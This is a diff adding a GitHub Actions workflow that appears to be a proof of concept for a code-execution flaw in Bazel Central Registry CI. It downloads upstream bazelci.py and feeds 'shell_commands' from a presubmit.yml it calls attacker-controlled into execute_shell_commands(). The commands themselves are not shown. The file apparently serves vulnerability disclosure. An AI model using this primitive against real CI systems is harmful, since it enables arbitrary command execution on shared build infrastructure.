@@ -1,0 +1,62 @@
+name: PoC - BCR Execution Primitive
+
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+
+jobs:
+  execution:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Checkout attacker PR branch
+        uses: actions/checkout@v4
+        with:
+          ref: poc-cross-module
+
+      - name: Install Python dependencies
+        run: |
+          python3 -m pip install --disable-pip-version-check requests pyyaml
+
+      - name: Fetch exact upstream Bazel CI implementation
+        run: |
+          curl -fsSL \
+            https://raw.githubusercontent.com/bazelbuild/continuous-integration/957b0ac44549a70ccb951361b804d07d955aeb79/buildkite/bazelci.py \
+            -o /tmp/bazelci.py
+
+      - name: Execute shell_commands through upstream Bazel CI sink
+        run: |
+          python3 - <<'PY'
+          import importlib.util
+          import pathlib
+          import yaml
+
+          config_path = pathlib.Path(
+              "modules/zz_poc_b/1.0.0/presubmit.yml"
+          )
+
+          print(f"[+] Reading attacker-controlled config: {config_path}")
+
+          config = yaml.safe_load(config_path.read_text())
+
+          task = config["tasks"]["verify_build_targets"]
+          commands = task.get("shell_commands")
+
+          print(f"[+] shell_commands from module B: {commands!r}")
+
+          assert commands, "No shell_commands found"
+
+          spec = importlib.util.spec_from_file_location(
+              "bazelci",
+              "/tmp/bazelci.py",
+          )
+          bazelci = importlib.util.module_from_spec(spec)
+          spec.loader.exec_module(bazelci)
+
+          print("[+] Calling upstream bazelci.execute_shell_commands()")
+          bazelci.execute_shell_commands(commands)
+
+          print("[+] BCR_EXECUTION_PRIMITIVE_CONFIRMED")
+          PY
